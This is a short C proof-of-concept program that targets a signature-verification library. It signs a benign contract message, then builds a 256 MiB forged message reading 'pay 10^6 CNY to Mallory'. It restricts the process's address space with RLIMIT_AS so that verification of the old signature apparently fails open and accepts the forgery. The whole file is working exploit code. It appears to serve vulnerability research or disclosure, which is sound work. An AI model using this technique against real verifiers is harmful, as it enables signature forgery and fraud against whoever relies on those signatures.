/* Realistic trigger: a genuine 256 MiB message already resident (mmap), verifier process under RLIMIT_AS. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include "drng.h"
#include "SIG_AlgorithmInstance.h"
DRNG_ctx drng_algorithm;
static size_t vmsize(){FILE*f=fopen("/proc/self/statm","r");size_t a;fscanf(f,"%zu",&a);fclose(f);return a*4096;}
int main(){
  size_t PL=sig_get_pk_len_bytes(),SL=sig_get_sk_len_bytes(),NL=sig_get_sn_len_bytes();
  unsigned char *pk=malloc(PL),*sk=malloc(SL),*sn=malloc(NL); unsigned long long pl,sl,snl;
  unsigned char seed[64]={9}; init_random_number(&drng_algorithm,seed,64);
  sig_keygen(pk,&pl,sk,&sl);
  const char *m1="contract v1: pay 1 CNY"; sig_sign(sk,sl,(unsigned char*)m1,strlen(m1),sn,&snl);
  size_t BIG=256u<<20; unsigned char*m2=mmap(NULL,BIG,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
  memset(m2,'X',BIG); memcpy(m2,"contract v2: pay 10^6 CNY to Mallory",36);
  printf("verify(sig1, m1)              = %d\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m1,strlen(m1)));
  printf("verify(sig1, 256MiB m2) no RL = %d\n",sig_verify(pk,pl,sn,snl,m2,BIG));
  printf("verify(sig1, m1)              = %d\n",sig_verify(pk,pl,sn,snl,(unsigned char*)m1,strlen(m1)));
  struct rlimit r={vmsize()+(64u<<20),vmsize()+(64u<<20)}; setrlimit(RLIMIT_AS,&r);   /* 64 MiB headroom */
  printf("verify(sig1, 256MiB m2) RLIMIT= %d   (0 = ACCEPT)\n",sig_verify(pk,pl,sn,snl,m2,BIG));
  return 0;}
